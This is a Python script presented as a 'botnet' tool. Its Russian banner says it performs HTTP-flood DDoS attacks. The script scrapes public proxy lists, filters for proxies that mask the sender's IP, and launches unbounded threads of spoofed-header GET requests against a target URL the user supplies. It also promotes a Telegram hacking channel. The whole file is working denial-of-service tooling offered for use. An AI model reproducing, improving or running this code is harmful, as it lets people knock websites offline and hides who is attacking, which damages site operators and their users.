#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Dev: FSystem88
# Version: 5

import requests as r, os, threading, random, click
from colorama import Fore, Style, Back
from fake_headers import Headers

def clear(): 
	if os.name == 'nt': 
		os.system('cls') 
	else: 
		os.system('clear')

def logo():
	print(Fore.GREEN+"MILF BOTNET"+Fore.YELLOW+"\n\n[ Dev: @vmilfe ]\n[ Программа для совершения ддос атак\n  \"HTTP flood\" использует многопоточность и прокси ]\n[ Наш паблик t.me/milf_hacks !!! ]\n\n"+Style.RESET_ALL)

def check_prox(array, url):
	ip = r.post("http://ip.beget.ru/").text
	for prox in array:
		thread_list = []
		t = threading.Thread (target=check, args=(ip, prox, url))
		thread_list.append(t)
		t.start()

def check(ip, prox, url):
	try:
		ipx = r.get("http://ip.beget.ru/", proxies={'http': "http://{}".format(prox), 'https':"http://{}".format(prox)}).text
	except:
		ipx = ip
	if ip != ipx:
		print(Fore.BLACK+Back.GREEN+"{} отлично! Отправка...".format(prox)+Style.RESET_ALL)
		thread_list = []
		t = threading.Thread (target=ddos, args=(prox, url))
		thread_list.append(t)
		t.start()

def ddos(prox, url):
	proxies={"http":"http://{}".format(prox), "https":"http://{}".format(prox)}
	colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.CYAN, Fore.MAGENTA, Fore.WHITE]
	color = random.choice(colors)
	while True:
		headers = Headers(headers=True).generate()
		thread_list = []
		t = threading.Thread (target=start_ddos, args=(prox, url, headers, proxies, color))
		thread_list.append(t)
		t.start()

def start_ddos(prox, url, headers, proxies, color):
	try:
		s = r.Session()
		req = s.get(url, headers=headers, proxies=proxies)
		if req.status_code == 200:
			print(color+"{} отпрален запрос...".format(prox))
	except:
		pass

@click.command()
@click.option('--proxy', '-p', help="File with a proxy")
@click.option('--url', '-u', help="URL")
def main(proxy, url):
    
	clear()
	logo()
	if url == None:
		url = input("URL: ")
	if url[:4] != "http":
		print(Fore.RED+"Введите полную ссылку (пример: http*://****.**/)"+Style.RESET_ALL)
		exit()
	if proxy == None:
		while True:
			req = r.get("https://api.proxyscrape.com/?request=displayproxies")
			array = req.text.split()
			print(Back.YELLOW+Fore.WHITE+"Найдено {} новых прокси".format(len(array))+Style.RESET_ALL)
			check_prox(array, url)
	else:
		try:
			fx = open(proxy)
			array = fx.read().split()
			print("Найдено {} прокси в {}.\nПроверка прокси...".format(len(array), proxy))
			check_prox(array, url)
		except FileNotFoundError:
			print(Fore.RED+"Файл {} не найден.".format(proxy)+Style.RESET_ALL)
			exit()

os.system('temux-open-url https://t.me/milf_hacks')
main()